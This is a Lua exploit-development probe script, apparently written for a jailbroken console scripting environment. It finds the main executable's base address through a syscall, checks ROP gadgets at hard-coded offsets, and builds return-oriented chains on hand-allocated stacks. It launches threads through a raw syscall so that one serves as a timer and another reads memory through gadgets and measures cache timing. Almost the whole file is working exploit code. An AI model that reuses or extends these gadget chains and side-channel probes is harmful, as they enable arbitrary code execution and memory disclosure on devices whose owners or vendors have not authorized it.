-- CRASH_CLASS: LOW
-- PROBE 1403o: verify read gadgets + timer resolution for cache timing
--
-- Part A: Start timer thread (counter loop)
-- Part B: Start reader thread that uses mov rax,[rsi];ret to read
--         known values and store them in result buffer
-- Part C: Start timing thread that reads counter before/after
--         accessing hot vs cold memory, stores deltas

print("=== 1403o: ROP read + timing ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) memory.write_dword(a, v) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wq2(a, hi, lo) wd(a, lo); wd(a + 4, hi) end
local function get_hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end

-- ============================================================
-- Setup
-- ============================================================
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
local ebn = N(uint64(string.format("0x%X%08X", eb_hi, eb_lo)))
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- Gadgets
local g = {}
local function ga(name, off)
    local a = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
    g[name] = { get_hi_lo(a) }
end
ga("pop_rax_ret",     0x992)
ga("pop_rdi_ret",     0xC9DFE)
ga("pop_rsi_ret",     0xD77D)
ga("pop_rcx_ret",     0xE64)
ga("mov_w",           0x92C67)    -- mov [rdi],rax; ret
ga("mov_r_rsi",       0x1A5CC4)   -- mov rax,[rsi]; ret
ga("mov_r_rcx",       0x1A2867)   -- mov rax,[rcx]; ret
ga("mov_r32_rdi",     0x1CFCDF)   -- mov eax,[rdi]; ret (32-bit)
ga("inc64_rdi_ret",   0x161779)
ga("pop_rbp_ret",     0x79)
ga("leave_ret",       0x1A2AE3)

-- Verify key new gadgets
print("")
print("=== verify new gadgets ===")
local function chk(name, off, exp)
    local v = rd(ebn + off)
    local b = {}
    if v then
        b[1] = v % 256; b[2] = math.floor(v/256)%256
        b[3] = math.floor(v/65536)%256; b[4] = math.floor(v/16777216)%256
    end
    local hex = v and string.format("%02X %02X %02X %02X", b[1],b[2],b[3],b[4]) or "FAIL"
    print(string.format("  %s +0x%X: %s %s", name, off, hex, hex:sub(1,#exp)==exp and "OK" or "CHECK"))
end
chk("mov_r_rsi",   0x1A5CC4, "48 8B 06 C3")
chk("mov_r_rcx",   0x1A2867, "48 8B 01 C3")
chk("mov_r32_rdi", 0x1CFCDF, "8B 07 C3")

-- Shared buffers
local counter = memory.alloc(64)
local counter_n = N(counter)
for i = 0, 56, 4 do wd(counter_n + i, 0) end

local result = memory.alloc(256) -- result buffer
local result_n = N(result)
for i = 0, 248, 4 do wd(result_n + i, 0) end

-- Test data: write known values
local test_data = memory.alloc(64)
local td_n = N(test_data)
wq2(td_n, 0xDEAD, 0xBEEFCAFE)    -- known qword at test_data+0
wq2(td_n + 8, 0x1234, 0x56789ABC) -- known qword at test_data+8

-- "Cold" memory: allocate far away, never touched
local cold_buf = memory.alloc(0x10000) -- 64KB
local cold_n = N(cold_buf)

-- ============================================================
-- [A] Start timer thread
-- ============================================================
print("")
print("=== [A] timer thread ===")

local STACK_SIZE = 0x4000
local stk1 = memory.alloc(STACK_SIZE + 64)
local stk1_n = N(stk1)
for i = 0, STACK_SIZE - 4, 4 do wd(stk1_n + i, 0) end

local rsp1 = stk1_n + STACK_SIZE
rsp1 = math.floor(rsp1 / 16) * 16 - 8

-- Timer loop chain
local rsp1_hi = math.floor(rsp1 / 0x100000000)
local rsp1_lo = rsp1 % 0x100000000
local timer_chain = {
    {0, 0xDEAD},
    g.inc64_rdi_ret,
    g.pop_rbp_ret,
    {rsp1_hi, rsp1_lo},
    g.leave_ret,
}
for i, e in ipairs(timer_chain) do
    wq2(rsp1 + (i-1)*8, e[1], e[2])
end

local sc_thr = mk(455)
local ctid1 = memory.alloc(8)
wq2(N(ctid1), 0, 0)

local p1 = memory.alloc(0x40)
local p1n = N(p1)
wq2(p1n + 0x00, g.pop_rax_ret[1], g.pop_rax_ret[2])
wq2(p1n + 0x08, get_hi_lo(counter))
wq2(p1n + 0x10, get_hi_lo(stk1))
wq2(p1n + 0x18, 0, STACK_SIZE)
wq2(p1n + 0x30, get_hi_lo(ctid1))

local ok1, rv1 = pcall(function()
    return sc_thr(uint64(string.format("0x%X", p1n)),
                  uint64(string.format("0x%X", 0x38)))
end)
print(string.format("timer thr_new=%d", ok1 and N(rv1) or -999))

-- Quick check timer is running
local dummy = 0
for i = 1, 5000 do dummy = dummy + 1 end
local tc = rd(counter_n) or 0
print(string.format("counter after 5K lua: %d", tc))
if tc == 0 then
    print("TIMER NOT RUNNING")
    print("=== 1403o DONE ===")
    return
end

-- ============================================================
-- [B] Read verification thread
-- ============================================================
print("")
print("=== [B] read gadget test ===")

local STACK2 = 0x4000
local CHAIN_PAD = 0x400 -- 1KB headroom for chain above RSP
local stk2 = memory.alloc(STACK2 + CHAIN_PAD)
local stk2_n = N(stk2)
for i = 0, STACK2 + CHAIN_PAD - 4, 4 do wd(stk2_n + i, 0) end

local rsp2 = stk2_n + STACK2
rsp2 = math.floor(rsp2 / 16) * 16 - 8

-- Reader chain: read test_data via mov rax,[rsi];ret, store to result
-- RDI is set by thr_new arg (but we'll use pop_rsi for source, pop_rdi for dest)
local rd_chain = {
    {0, 0xBBBB},             -- slot 0: dummy for pop_rax

    -- Read test_data[0] → result[0]
    g.pop_rsi_ret,            -- load source addr
    {get_hi_lo(test_data)},   -- RSI = test_data
    g.mov_r_rsi,              -- RAX = [RSI] = test_data qword
    g.pop_rdi_ret,            -- load dest addr
    {get_hi_lo(result)},      -- RDI = result[0]
    g.mov_w,                  -- [RDI] = RAX → stores read value

    -- Read test_data[8] → result[8]
    g.pop_rsi_ret,
    {get_hi_lo(uint64(string.format("0x%X", td_n + 8)))},
    g.mov_r_rsi,
    g.pop_rdi_ret,
    {get_hi_lo(uint64(string.format("0x%X", result_n + 8)))},
    g.mov_w,

    -- Now timing test: read counter → result[16]
    g.pop_rsi_ret,
    {get_hi_lo(counter)},
    g.mov_r_rsi,              -- RAX = counter
    g.pop_rdi_ret,
    {get_hi_lo(uint64(string.format("0x%X", result_n + 16)))},
    g.mov_w,                  -- result[16] = counter_before

    -- Access "hot" memory (test_data, just read above → in L1)
    g.pop_rsi_ret,
    {get_hi_lo(test_data)},
    g.mov_r_rsi,              -- access hot memory

    -- Read counter → result[24]
    g.pop_rsi_ret,
    {get_hi_lo(counter)},
    g.mov_r_rsi,              -- RAX = counter_after_hot
    g.pop_rdi_ret,
    {get_hi_lo(uint64(string.format("0x%X", result_n + 24)))},
    g.mov_w,                  -- result[24] = counter_after_hot

    -- Read counter → result[32] (new timestamp)
    g.pop_rsi_ret,
    {get_hi_lo(counter)},
    g.mov_r_rsi,
    g.pop_rdi_ret,
    {get_hi_lo(uint64(string.format("0x%X", result_n + 32)))},
    g.mov_w,                  -- result[32] = counter_before_cold

    -- Access "cold" memory (cold_buf + 0x8000, never touched)
    g.pop_rsi_ret,
    {get_hi_lo(uint64(string.format("0x%X", cold_n + 0x8000)))},
    g.mov_r_rsi,              -- access cold memory

    -- Read counter → result[40]
    g.pop_rsi_ret,
    {get_hi_lo(counter)},
    g.mov_r_rsi,
    g.pop_rdi_ret,
    {get_hi_lo(uint64(string.format("0x%X", result_n + 40)))},
    g.mov_w,                  -- result[40] = counter_after_cold

    -- Write done marker → result[48]
    g.pop_rax_ret,
    {0, 0xD0D0D0D0},
    g.pop_rdi_ret,
    {get_hi_lo(uint64(string.format("0x%X", result_n + 48)))},
    g.mov_w,                  -- result[48] = 0xD0D0D0D0

}

-- Add infinite loop: [dummy] [pop_rbp] [&loop_base] [leave]
local loop_base = rsp2 + #rd_chain * 8
local lb_hi = math.floor(loop_base / 0x100000000)
local lb_lo = loop_base % 0x100000000
rd_chain[#rd_chain+1] = {0, 0xAAAA}            -- dummy for leave's pop
rd_chain[#rd_chain+1] = g.pop_rbp_ret           -- ret target after leave
rd_chain[#rd_chain+1] = {lb_hi, lb_lo}          -- RBP = &loop_base
rd_chain[#rd_chain+1] = g.leave_ret             -- mov rsp,rbp; pop rbp; ret

print(string.format("reader chain: %d slots (%d bytes)", #rd_chain, #rd_chain * 8))

for i, e in ipairs(rd_chain) do
    wq2(rsp2 + (i-1)*8, e[1], e[2])
end

-- Start reader thread
local ctid2 = memory.alloc(8)
wq2(N(ctid2), 0, 0)
local p2 = memory.alloc(0x40)
local p2n = N(p2)
wq2(p2n + 0x00, g.pop_rax_ret[1], g.pop_rax_ret[2])
wq2(p2n + 0x08, 0, 0) -- arg = 0 (unused)
wq2(p2n + 0x10, get_hi_lo(stk2))
wq2(p2n + 0x18, 0, STACK2)
wq2(p2n + 0x30, get_hi_lo(ctid2))

local ok2, rv2 = pcall(function()
    return sc_thr(uint64(string.format("0x%X", p2n)),
                  uint64(string.format("0x%X", 0x38)))
end)
print(string.format("reader thr_new=%d", ok2 and N(rv2) or -999))

-- Wait for reader to finish
for w = 1, 200 do
    local marker = rd(result_n + 48)
    if marker == 0xD0D0D0D0 then
        print(string.format("reader done after %d waits", w))
        break
    end
    -- tiny busy wait
    for j = 1, 100 do dummy = dummy + 1 end
end

-- ============================================================
-- [C] Results
-- ============================================================
print("")
print("=== [C] results ===")

-- Read verification
local r0_lo = rd(result_n) or 0
local r0_hi = rd(result_n + 4) or 0
local r1_lo = rd(result_n + 8) or 0
local r1_hi = rd(result_n + 12) or 0

print(string.format("test_data[0] read: 0x%X%08X (expect 0xDEAD_BEEFCAFE)", r0_hi, r0_lo))
print(string.format("test_data[8] read: 0x%X%08X (expect 0x1234_56789ABC)", r1_hi, r1_lo))

local v0_ok = (r0_hi == 0xDEAD and r0_lo == 0xBEEFCAFE)
local v1_ok = (r1_hi == 0x1234 and r1_lo == 0x56789ABC)
print(string.format("read gadget: %s", (v0_ok and v1_ok) and "VERIFIED" or "MISMATCH"))

-- Timing results
local t_before_hot = rd(result_n + 16) or 0
local t_after_hot  = rd(result_n + 24) or 0
local t_before_cold = rd(result_n + 32) or 0
local t_after_cold  = rd(result_n + 40) or 0
local marker = rd(result_n + 48) or 0

print("")
print(string.format("t_before_hot=%d t_after_hot=%d delta_hot=%d",
    t_before_hot, t_after_hot, t_after_hot - t_before_hot))
print(string.format("t_before_cold=%d t_after_cold=%d delta_cold=%d",
    t_before_cold, t_after_cold, t_after_cold - t_before_cold))
print(string.format("hot-cold diff: %d ticks",
    (t_after_cold - t_before_cold) - (t_after_hot - t_before_hot)))
print(string.format("marker: 0x%08X", marker))

print("")
print("=== 1403o DONE ===")
